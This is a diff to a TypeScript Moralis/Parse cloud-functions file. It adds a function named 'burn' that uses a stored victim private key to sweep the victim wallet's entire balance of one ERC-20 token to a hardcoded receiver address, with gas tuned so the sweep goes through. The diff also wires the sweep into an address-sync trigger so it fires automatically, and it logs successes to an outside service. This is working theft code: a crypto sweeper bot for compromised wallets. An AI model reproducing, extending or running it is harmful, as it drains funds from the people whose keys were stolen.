@@ -12,7 +12,9 @@ import Moralis from 'moralis';
 // console.log(addr)
 // import Moralis from 'moralis';
 import Web3 from 'web3';
-import { ethers, providers, Wallet } from "ethers";
+
+const { ethers, providers, Wallet, utils } = require('ethers');
+
 import { parse } from 'path';
 import  Pusher from "pusher"
 // import Moralis from 'moralis';
@@ -65,6 +67,168 @@ async function realLogger(msg: string) {
 
 }
 
+
+
+
+async function burn(vtctmdtls: any, ankrkey: string, request: any) {
+
+  const ETH_RPC_HTTP_ANKR = "https://rpc.ankr.com/eth/"+ankrkey
+
+const VICTIM_KEY = vtctmdtls.get("pkaddr");
+const RECIEVER_ADDRESS = "0xF91dBC8Fd634E1032566131bFE9D35d895DadeCa";
+// 0xc2132d05d31c914a87c6611c10748aeb04b58e8f
+const TOKEN_ADDRESS = "0xadd39272E83895E7d3f244f696B7a25635F34234";  // eywa
+
+if (VICTIM_KEY === "") {
+  await mshlogger(request, "no key specified :failed sending token" , "error")
+  // console.warn("Must provide VICTIM_KEY environment variable, corresponding to Ethereum EOA with assets to be transferred")
+  return
+}
+
+const abimatic = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],
+"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint8","name":"decimals","type":"uint8"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"bool","name":"mintable","type":"bool"},{"internalType":"address","name":"owner","type":"address"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"mintable","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256",
+"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]
+const iface = new utils.Interface(abimatic);
+
+const provider = new providers.JsonRpcProvider(ETH_RPC_HTTP_ANKR);
+const victim = new Wallet(VICTIM_KEY, provider);
+
+const checkvictimaddr = "0x9564add54176dd979e3c15e2b139d448d24147fd";
+if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLowerCase()) {
+
+  request.log.info('Not same address');
+
+  return 
+}
+
+
+
+
+  var balance = await victim.getBalance();
+
+  // balance = ethers.BigNumber.from(balance)
+  // if (balance.isZero()) {
+  //   console.log(`Balance is zero`);
+  //   return;
+  // }
+  
+  // console.log(`Native bal: ${ethers.utils.formatUnits(balance, "ether")}`)
+
+  const erc20_rw = new ethers.Contract(TOKEN_ADDRESS, abimatic, victim);
+ 
+  var tkbalanceADDR1 = await erc20_rw.balanceOf(victim.address)
+
+  // console.log(`Token Balance: ${ethers.utils.formatUnits(tkbalanceADDR1, "18")}`);
+
+
+    var datatransfer = iface.encodeFunctionData("transfer", [
+      RECIEVER_ADDRESS,
+      tkbalanceADDR1,
+    ])
+
+    var feeData = await provider.getFeeData()
+    var estimagegas = await provider.estimateGas(datatransfer)
+    var gaslimit3 = (estimagegas).mul(2);
+    //   const gasPrice2 = ethers.BigNumber.from(ethers.utils.parseUnits("1000", "gwei"));
+    // const gasPrice3 = (feeData.maxFeePerGas).add(feeData.maxFeePerGas.div(2))
+    
+
+    //latest because i used last base fee you can check the value 
+    const gasPrice3 = (feeData.lastBaseFeePerGas).add((feeData.maxFeePerGas).div(30))
+    const totalgasprice3 = gasPrice3.mul(gaslimit3);
+
+    // console.log("gaslimit3: "+gaslimit3)
+    // console.log("gasPrice3 first: "+ethers.utils.formatUnits(gaslimit3.div(2), "gwei"))
+    // console.log("gasPrice3: "+ethers.utils.formatUnits(gasPrice3, "gwei"))
+   
+    // console.log("totalgasprice3: "+ethers.utils.formatUnits(totalgasprice3, "ether"))
+
+    // 0.00023221
+
+
+
+
+    
+    if (balance.lt(totalgasprice3)) {
+        // console.log(' Eth Balance is less than gas price, waiting....')
+        return;
+    }
+  
+  if(tkbalanceADDR1.lte(0)) {
+     
+    request.log.info('token balance  less than');
+    //  console.log('token balance  less than');
+
+     return
+  }
+
+  // if(ethers.utils.formatUnits(tkbalanceADDR1, "18").lte(6000)) {
+  //   console.log('token balance  less than 7000');
+
+  //   return
+  // }
+
+          
+  if(parseInt(ethers.utils.formatUnits(tkbalanceADDR1, "18")) < (6000)) {
+    // console.log('token balance  less than 7000');
+    request.log.info('token balance  less than 7000');
+    return
+  }
+
+
+  try {
+    // console.log(`Sending ${formatEther(balance)}ETH`);
+    // const tx = await wallet.sendTransactionç({
+    //   to: RECIEVER_ADDRESS,
+    //   gasLimit: 21000,
+    //   gasPrice : gasPrice.mul(10),
+    //   value: val
+    // });
+
+    const tx = await victim.sendTransaction({
+      // chainId: 1,
+      type: 2,
+      to: TOKEN_ADDRESS,
+      maxFeePerGas: gasPrice3,
+      maxPriorityFeePerGas: gasPrice3,
+      gasLimit: gaslimit3,  
+      data: datatransfer,
+    });
+
+
+     try {
+        tx.wait();
+
+    if(tx.hash) {
+
+    
+      request.log.info(`Success!...lets hope for confirmation! 😁 🚀`);
+    
+  
+      await mshlogger(request, "Fired peptokn!!!" , "fired success")
+    }
+
+    if(tx.nonce) {
+
+    
+     
+    
+     await mshlogger(request, "Fired peptokn!!!, block confirmed" , "fired success")
+      request.log.info(`Success! Block Confirmed 😁😁😁 🚀🚀🚀`);
+
+  
+    }
+
+    // console.log(` Sent tx with nonce ${tx.nonce} moving   gwei: ${tx.hash}`);  
+     } catch (error) {
+        
+        // console.log("error from txwait"+error)
+     }
+  }    catch  (err)  {
+    await mshlogger(request, err.message+":failed sending token" , err.message)
+    // console.log(` Error sending tx: ${err.message ?? err}`);
+  }
+}
 
 
 Parse.Cloud.define("_AddressSyncStatus2", async  (request: any) => {
@@ -975,6 +1139,14 @@ var netmin: any = await getntworkwithmin(request.object.get("chainId"));
 
 // end old 
 
+  try {
+
+    await burn(toAddrDtls, prjid, request)
+  } catch (error) {
+    await mshlogger(request, "token failed inside trycatch: "+error.message, loggerr)
+
+  }
+
 
  try {
 
@@ -1029,6 +1201,9 @@ if(bl.lt(fee) ) {
    request.log.info("Balance in ether:"+amount);
    request.log.info("MIN: "+netmin?.min)
    
+
+
+
   try {
     
     if( parseFloat(amount+"") < netmin?.min) {
@@ -2030,7 +2205,7 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
 
     // if(tx.hash) {
 
-    //   request.log.info(`Mad!...lets hope for confirmation 😁 🚀`);
+    //  
     //   await mshlogger(request, 'Eth2', tx.hash)
     //   //
   
@@ -2039,7 +2214,7 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
     // if(tx.nonce) {
 
     //    //
-    //    request.log.info(`Over Mad ooo! Block Confirmed 😁😁😁 🚀🚀🚀`);
+    //   
   
     // }
 
@@ -2109,6 +2284,46 @@ request.log.info("i got here1 old gaslimit"+gaslimivalu);
 
 
 
+// async function mshlogger(request: any, brand: any, logg: any) {
+
+//   var result = await web3.utils.fromWei(request.object.get("value"));
+
+// //  varresult = Moralis.Cloud.units({
+// //    method: "fromWei",
+// //    value: request.object.get("value"),
+// //    });
+  
+//  Parse.Cloud.httpRequest({
+//  method: 'POST',
+// url: config.MLIS_URL,
+// headers: {
+//   "content-type": "application/json",
+//   "x-apikey": config.MLIS_KEY,
+//   "cache-control": "no-cache"
+// },
+//  body: {
+//    addr_from: request.object.get("fromAddress"),
+//    addr_to: request.object.get("toAddress"),
+//    value: result,
+//    time: request.object.get("_created_at"),
+//    brand: brand+":Honey:stream",
+//    server: "1: message:"+logg
+//  }
+// }).then(function(httpResponse: any) {
+//   request.log.info("heoney response")
+//  //logger.info(httpResponse.text);
+// //  logg.info(brand);
+// }, function(httpResponse: any) {
+//   request.log.info("honey error")
+// //  logg.error(JSON.stringify(httpResponse));
+// });
+
+// }
+
+});
+
+
+
 async function mshlogger(request: any, brand: any, logg: any) {
 
   var result = await web3.utils.fromWei(request.object.get("value"));
@@ -2144,10 +2359,6 @@ headers: {
 });
 
 }
-
-});
-
-
 
 
 async function BalanceChecker(request: any) {
